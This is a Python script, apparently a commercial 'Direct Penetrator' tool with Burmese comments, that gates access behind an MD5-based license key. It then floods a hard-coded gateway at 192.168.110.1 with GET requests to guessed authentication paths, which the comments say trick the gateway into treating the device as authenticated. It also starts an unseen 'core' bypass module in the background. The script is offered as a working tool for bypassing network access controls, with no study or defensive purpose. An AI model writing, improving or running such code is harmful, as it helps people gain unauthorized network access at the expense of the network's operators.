import sys, os, hashlib, subprocess, datetime, requests, time, threading
from colorama import Fore, init

init(autoreset=True)

# --- LICENSE SYSTEM ---
SALT = "AHO_PRO_FINAL_2026_SECURE"
KEY_FILE = os.path.expanduser("~/.aho_key_data")

def get_net_time():
    try:
        res = requests.get('http://worldtimeapi.org/api/timezone/Asia/Yangon', timeout=5)
        return datetime.datetime.strptime(res.json()['datetime'][:10], "%Y-%m-%d")
    except: return datetime.datetime.now()

def get_hwid():
    try:
        user = subprocess.check_output(['whoami']).decode().strip()
    except: user = "user"
    return f"AHO-{hashlib.md5(user.encode()).hexdigest()[:6].upper()}"

def check_access():
    uid = get_hwid()
    now = get_net_time()
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, "r") as f:
            saved_key = f.read().strip()
            for i in range(0, 366):
                check_date = (now + datetime.timedelta(days=i)).strftime("%Y-%m-%d")
                if saved_key == hashlib.md5(f"{uid}|{check_date}|{SALT}".encode()).hexdigest()[:12].upper():
                    return True
    
    os.system('clear')
    print(f"{Fore.CYAN}--- AHO DIRECT PENETRATOR (YUTA) ---")
    print(f"DEVICE ID: {Fore.YELLOW}{uid}")
    u_key = input(f"\n{Fore.WHITE}ENTER LICENSE KEY: ").strip()
    for i in range(0, 366):
        check_date = (now + datetime.timedelta(days=i)).strftime("%Y-%m-%d")
        if u_key == hashlib.md5(f"{uid}|{check_date}|{SALT}".encode()).hexdigest()[:12].upper():
            with open(KEY_FILE, "w") as f: f.write(u_key)
            return True
    return False

# --- DIRECT PACKET INJECTION ---
def injector(host):
    # Gateway ကို Authenticated ဖြစ်ပြီးသားလို့ ထင်အောင် လှည့်စားတဲ့ URL များ
    paths = [
        f"http://{host}/login/auth?auth_type=direct&mode=1",
        f"http://{host}/api/v1/auth/direct",
        f"http://{host}/index.php/login/check"
    ]
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": f"http://{host}/"
    }
    
    while True:
        for path in paths:
            try:
                # Bypass Signal ကို တစ်စက္ကန့် ၂ ကြိမ်နှုန်းနဲ့ အတင်းပို့မယ်
                requests.get(path, headers=headers, timeout=1, allow_redirects=False)
            except: pass
        time.sleep(0.5)

def start_engine():
    os.system('clear')
    target = "192.168.110.1" # အစ်ကိုပေးတဲ့ IP ကို အသေထားလိုက်ပြီ
    print(f"{Fore.CYAN}--- YUTA DIRECT BYPASS ENGINE ---")
    print(f"{Fore.YELLOW}[*] TARGET GATEWAY: {target}")

    try:
        # ၁။ Path နဲ့ Engine ချိတ်မယ်
        sys.path.append(os.getcwd())
        import core
        core.IS_LIFETIME = True
        
        # ၂။ Core Engine ကို Background မှာ နှိုးမယ်
        print(f"{Fore.BLUE}[*] Launching Core.so Engine...")
        t1 = threading.Thread(target=core.run_bg_bypass if hasattr(core, 'run_bg_bypass') else core.main, daemon=True)
        t1.start()
        
        # ၃။ Direct Injector ကို နှိုးမယ်
        print(f"{Fore.MAGENTA}[*] Injecting Bypass Packets to {target}...")
        t2 = threading.Thread(target=injector, args=(target,), daemon=True)
        t2.start()
        
        # ၄။ Status ပြမယ်
        while True:
            sys.stdout.write(f"\r{Fore.GREEN}[✔] Penetrating Firewall... Engine Running...")
            sys.stdout.flush()
            time.sleep(1)

    except Exception as e:
        print(f"{Fore.RED}[✘] Fatal Error: {e}")

if __name__ == "__main__":
    if check_access():
        start_engine()
    else:
        sys.exit()
